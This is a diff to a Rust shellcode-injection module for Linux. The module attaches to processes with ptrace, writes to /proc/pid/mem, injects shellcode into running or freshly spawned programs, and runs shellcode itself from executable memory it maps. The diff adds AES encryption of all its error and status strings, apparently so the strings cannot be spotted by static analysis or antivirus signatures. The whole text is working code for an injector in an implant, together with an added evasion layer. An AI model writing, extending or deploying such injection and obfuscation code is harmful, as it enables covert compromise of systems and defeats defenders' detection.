@@ -13,6 +13,8 @@ use std::fs::{File, OpenOptions};
 use std::os::unix::fs::FileExt;
 use std::process::Command;
 use std::os::unix::process::CommandExt;
+use crate::strcrypt_rt;
+use strcrypt::aes_str;
 
 fn read_mem(pid: i32, addr: u64, len: usize) -> Result<Vec<u8>, String> {
     let path = format!("/proc/{}/mem", pid);
@@ -32,7 +34,7 @@ fn write_mem(pid: i32, addr: u64, data: &[u8]) -> Result<(), String> {
 unsafe fn perform_injection_logic(pid: i32, shellcode: &[u8]) -> Result<String, String> {
     let mut old_regs: user_regs_struct = mem::zeroed();
     if ptrace(PTRACE_GETREGS, pid, ptr::null_mut::<c_void>(), &mut old_regs as *mut _ as *mut c_void) < 0 {
-        return Err("Failed to get regs".to_string());
+        return Err(aes_str!("Failed to get regs"));
     }
 
     #[rustfmt::skip]
@@ -57,7 +59,7 @@ unsafe fn perform_injection_logic(pid: i32, shellcode: &[u8]) -> Result<String, 
     
     if !WIFSTOPPED(status) || WSTOPSIG(status) != SIGTRAP {
         let _ = write_mem(pid, old_regs.rip, &backup);
-        return Err("Stub failed to trap".to_string());
+        return Err(aes_str!("Stub failed to trap"));
     }
 
     let mut new_regs: user_regs_struct = mem::zeroed();
@@ -83,7 +85,7 @@ unsafe fn perform_injection_logic(pid: i32, shellcode: &[u8]) -> Result<String, 
 pub unsafe fn inject_remote(pid: u32, shellcode: &[u8]) -> Result<String, String> {
     let pid_i32 = pid as i32;
     if ptrace(PTRACE_ATTACH, pid_i32, ptr::null_mut::<c_void>(), ptr::null_mut::<c_void>()) < 0 {
-        return Err("Failed to attach".to_string());
+        return Err(aes_str!("Failed to attach"));
     }
     let mut status = 0;
     waitpid(pid_i32, &mut status, 0);
@@ -101,7 +103,7 @@ pub unsafe fn inject_spawn(binary: &str, shellcode: &[u8]) -> Result<String, Str
     waitpid(pid, &mut status, 0);
     if !WIFSTOPPED(status) {
         let _ = kill(pid, 9);
-        return Err("Child did not stop at exec".to_string());
+        return Err(aes_str!("Child did not stop at exec"));
     }
     let res = perform_injection_logic(pid, shellcode);
     ptrace(PTRACE_DETACH, pid, ptr::null_mut::<c_void>(), ptr::null_mut::<c_void>());
@@ -110,9 +112,9 @@ pub unsafe fn inject_spawn(binary: &str, shellcode: &[u8]) -> Result<String, Str
 
 pub unsafe fn inject_self(shellcode: &[u8]) -> Result<String, String> {
     let ptr = mmap(ptr::null_mut(), shellcode.len(), PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
-    if ptr == libc::MAP_FAILED { return Err("mmap failed".to_string()); }
+    if ptr == libc::MAP_FAILED { return Err(aes_str!("mmap failed")); }
     ptr::copy_nonoverlapping(shellcode.as_ptr(), ptr as *mut u8, shellcode.len());
     let func: extern "C" fn() = mem::transmute(ptr);
     std::thread::spawn(move || { func(); });
-    Ok("Self-injection thread spawned".to_string())
+    Ok(aes_str!("Self-injection thread spawned"))
 }
